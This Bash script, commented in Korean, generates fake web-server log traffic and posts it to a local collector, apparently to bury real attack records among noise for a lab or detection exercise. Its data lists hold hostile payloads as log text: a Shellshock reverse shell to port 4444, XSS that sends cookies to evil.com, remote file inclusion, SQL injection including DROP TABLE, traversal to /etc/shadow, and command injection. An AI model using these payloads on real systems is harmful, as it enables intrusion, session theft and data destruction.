#!/bin/bash
# 노이즈 로그 생성기 - 실제 공격 로그를 헷갈리게 만들기 위한 다양한 트래픽

TARGET="http://localhost:8081/logs"

# IP 풀 (공격자/피해자 IP 포함해서 섞기)
REAL_IPS=("10.100.0.191" "10.100.0.195" "10.100.0.196")
NOISE_IPS=(
  "192.168.1.10" "192.168.1.23" "192.168.0.5"
  "10.0.0.14" "10.0.0.33" "172.16.0.8"
  "203.0.113.45" "198.51.100.12" "185.220.101.47"
  "45.33.32.156" "104.21.45.67" "151.101.1.200"
)
ALL_IPS=("${REAL_IPS[@]}" "${NOISE_IPS[@]}")

# 정상 User-Agent
NORMAL_UAS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
  "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
  "curl/7.88.1"
  "python-requests/2.31.0"
  "Go-http-client/1.1"
  "Java/11.0.19"
  "okhttp/4.11.0"
  "Wget/1.21.3"
)

# 스캐너/공격툴 UA (노이즈)
SCANNER_UAS=(
  "Nmap Scripting Engine"
  "masscan/1.3.2"
  "zgrab/0.x"
  "nuclei/2.9.6"
  "sqlmap/1.7.8#stable"
  "nikto/2.1.6"
  "dirbuster/1.0-RC1"
  "gobuster/3.6"
  "wfuzz/3.1.0"
  "Acunetix/14.0"
  "OpenVAS/21.4"
  "WPScan v3.8.22"
  "Burp Suite"
)

# 다양한 웹 공격 UA (스캐너/익스플로잇 툴)
ATTACK_UAS=(
  "sqlmap/1.7.8#stable (https://sqlmap.org)"
  "Havij v1.17 Free"
  "() { :;}; /bin/bash -i >& /dev/tcp/10.0.0.14/4444 0>&1"
  "Mozilla/5.0 zgrab/0.x"
  "<script>fetch('http://evil.com/?c='+document.cookie)</script>"
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Nmap Scripting Engine)"
  "WPScan v3.8.22 (https://wpscan.com/wordpress-security-scanner)"
  "Metasploit/6.3.0"
  "python-httpx/0.24.1"
  "curl/7.29.0 (CVE-scan)"
)

# 다양한 경로
PATHS=(
  "/shop" "/shop/product" "/shop/cart" "/shop/checkout"
  "/api/v1/users" "/api/v1/products" "/api/v2/orders"
  "/admin" "/admin/login" "/admin/dashboard"
  "/login" "/logout" "/register" "/profile"
  "/.env" "/.git/config" "/wp-admin" "/phpmyadmin"
  "/actuator/health" "/actuator/env" "/actuator/beans"
  "/../../../etc/passwd" "/etc/shadow" "/proc/self/environ"
  "/cgi-bin/test.cgi" "/cgi-bin/../../../../bin/sh"
  "/index.php?id=1 OR 1=1" "/search?q=<script>alert(1)</script>"
  "/upload" "/download?file=../../etc/passwd"
  "/api/graphql" "/graphql?query={__schema{types{name}}}"
  "/console" "/manager/html" "/jmx-console"
  "/struts2-blank/example/HelloWorld.action"
  "/webtools/control/main" "/invoker/EJBInvokerServlet"
)

# HTTP 메서드
METHODS=("GET" "POST" "PUT" "DELETE" "PATCH" "OPTIONS" "HEAD")

# 상태코드 (가중치)
STATUS_CODES=("200" "200" "200" "200" "301" "302" "400" "401" "403" "404" "404" "500" "502")

# 타임스탬프 생성 (과거 ~현재)
rand_ts() {
  local offset=$((RANDOM % 86400))
  date -d "-${offset} seconds" "+%d/%b/%Y:%H:%M:%S +0900" 2>/dev/null || \
  date -v-${offset}S "+%d/%b/%Y:%H:%M:%S +0900" 2>/dev/null || \
  echo "$(date '+%d/%b/%Y:%H:%M:%S') +0900"
}

rand_elem() {
  local arr=("$@")
  echo "${arr[$((RANDOM % ${#arr[@]}))]}"
}

rand_bytes() {
  echo $((RANDOM % 50000 + 100))
}

# nginx 포맷 로그 전송
send_nginx() {
  local ip="$1" ts="$2" method="$3" path="$4" status="$5" bytes="$6" referer="$7" ua="$8"
  local log="${ip} - - [${ts}] \"${method} ${path} HTTP/1.1\" ${status} ${bytes} \"${referer}\" \"${ua}\""
  curl -s -X POST "$TARGET" -H "Content-Type: text/plain" -d "$log" > /dev/null
}

# JSON 포맷 로그 전송
send_json() {
  local ip="$1" ts="$2" method="$3" path="$4" status="$5" ua="$6" referer="$7"
  curl -s -X POST "$TARGET" -H "Content-Type: application/json" \
    -d "{\"time\":\"${ts}\",\"ip\":\"${ip}\",\"method\":\"${method}\",\"path\":\"${path}\",\"status\":\"${status}\",\"ua\":\"${ua}\",\"referer\":\"${referer}\"}" \
    > /dev/null
}

echo "[*] 노이즈 로그 생성 시작..."
echo "[*] TARGET: $TARGET"
echo "[*] Ctrl+C로 중지"
echo ""

COUNT=0

while true; do
  # 1. 정상 트래픽 (60%)
  for i in $(seq 1 6); do
    ip=$(rand_elem "${ALL_IPS[@]}")
    ts=$(rand_ts)
    method=$(rand_elem "GET" "GET" "GET" "POST" "POST")
    path=$(rand_elem "/shop" "/shop/product" "/api/v1/products" "/login" "/profile" "/shop/cart")
    status=$(rand_elem "200" "200" "200" "301" "302")
    bytes=$(rand_bytes)
    ua=$(rand_elem "${NORMAL_UAS[@]}")
    send_nginx "$ip" "$ts" "$method" "$path" "$status" "$bytes" "-" "$ua"
  done

  # 2. 스캐너 트래픽 (15%)
  for i in $(seq 1 2); do
    ip=$(rand_elem "${NOISE_IPS[@]}")
    ts=$(rand_ts)
    method=$(rand_elem "${METHODS[@]}")
    path=$(rand_elem "${PATHS[@]}")
    status=$(rand_elem "403" "404" "200" "500")
    bytes=$(rand_bytes)
    ua=$(rand_elem "${SCANNER_UAS[@]}")
    send_nginx "$ip" "$ts" "$method" "$path" "$status" "$bytes" "-" "$ua"
  done

  # 3. SQLi 시도 (15%)
  for i in $(seq 1 3); do
    ip=$(rand_elem "${NOISE_IPS[@]}")
    ts=$(rand_ts)
    path=$(rand_elem \
      "/shop?id=1' OR '1'='1" \
      "/shop?id=1 UNION SELECT 1,2,3,4,5--" \
      "/api/users?id=1; DROP TABLE users--" \
      "/login?user=admin'--&pass=x" \
      "/search?q=1' AND SLEEP(5)--" \
      "/api/v1/products?filter=1' OR 1=1#" \
      "/shop?category=1' ORDER BY 10--" \
      "/api/orders?id=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--" \
    )
    status=$(rand_elem "200" "400" "500" "403")
    bytes=$(rand_bytes)
    ua=$(rand_elem "${SCANNER_UAS[@]}" "${ATTACK_UAS[@]}")
    send_nginx "$ip" "$ts" "GET" "$path" "$status" "$bytes" "-" "$ua"
  done

  # 4. XSS 시도 (10%)
  for i in $(seq 1 2); do
    ip=$(rand_elem "${NOISE_IPS[@]}")
    ts=$(rand_ts)
    path=$(rand_elem \
      "/search?q=<script>alert(1)</script>" \
      "/shop?name=<img src=x onerror=alert(document.cookie)>" \
      "/comment?text=<svg onload=fetch('http://evil.com/?c='+document.cookie)>" \
      "/profile?bio=javascript:alert(1)" \
      "/api/v1/users?name=<iframe src='http://evil.com'>" \
    )
    status=$(rand_elem "200" "400" "403")
    bytes=$(rand_bytes)
    ua=$(rand_elem "${NORMAL_UAS[@]}" "${ATTACK_UAS[@]}")
    send_nginx "$ip" "$ts" "POST" "$path" "$status" "$bytes" "-" "$ua"
  done

  # 5. 경로 탐색 / LFI / RFI (10%)
  for i in $(seq 1 2); do
    ip=$(rand_elem "${NOISE_IPS[@]}")
    ts=$(rand_ts)
    path=$(rand_elem \
      "/../../../etc/passwd" \
      "/download?file=../../etc/shadow" \
      "/api/file?path=/proc/self/environ" \
      "/view?page=../../../../windows/win.ini" \
      "/include?url=http://evil.com/shell.php" \
      "/api/read?path=....//....//etc/passwd" \
      "/static/../../../etc/hosts" \
    )
    status=$(rand_elem "200" "400" "403" "404")
    bytes=$(rand_bytes)
    ua=$(rand_elem "${SCANNER_UAS[@]}")
    send_nginx "$ip" "$ts" "GET" "$path" "$status" "$bytes" "-" "$ua"
  done

  # 6. 커맨드 인젝션 / SSTI (10%)
  for i in $(seq 1 2); do
    ip=$(rand_elem "${NOISE_IPS[@]}")
    ts=$(rand_ts)
    path=$(rand_elem \
      "/api/ping?host=127.0.0.1;id" \
      "/api/exec?cmd=cat+/etc/passwd" \
      "/search?q={{7*7}}" \
      "/template?name=\${7*7}" \
      "/api/convert?file=test.pdf;ls+-la" \
      "/ping?ip=127.0.0.1|whoami" \
      "/api/lookup?domain=evil.com\`id\`" \
    )
    status=$(rand_elem "200" "400" "500")
    bytes=$(rand_bytes)
    ua=$(rand_elem "${ATTACK_UAS[@]}" "${SCANNER_UAS[@]}")
    send_nginx "$ip" "$ts" "GET" "$path" "$status" "$bytes" "-" "$ua"
  done

  # 7. 인증 브루트포스 (5%)
  ip=$(rand_elem "${NOISE_IPS[@]}")
  ts=$(rand_ts)
  path=$(rand_elem "/login" "/admin/login" "/api/auth" "/wp-login.php")
  status=$(rand_elem "401" "401" "403" "200")
  bytes=$(rand_bytes)
  ua=$(rand_elem "${NORMAL_UAS[@]}")
  send_nginx "$ip" "$ts" "POST" "$path" "$status" "$bytes" "-" "$ua"

  # 8. JSON 포맷 로그 (5%)
  ip=$(rand_elem "${ALL_IPS[@]}")
  ts=$(date -Iseconds)
  method=$(rand_elem "${METHODS[@]}")
  path=$(rand_elem "${PATHS[@]}")
  status=$(rand_elem "${STATUS_CODES[@]}")
  ua=$(rand_elem "${NORMAL_UAS[@]}" "${SCANNER_UAS[@]}" "${ATTACK_UAS[@]}")
  send_json "$ip" "$ts" "$method" "$path" "$status" "$ua" "-"

  COUNT=$((COUNT + 13))
  echo -ne "\r[*] 전송: ${COUNT}건"
  sleep 0.5
done
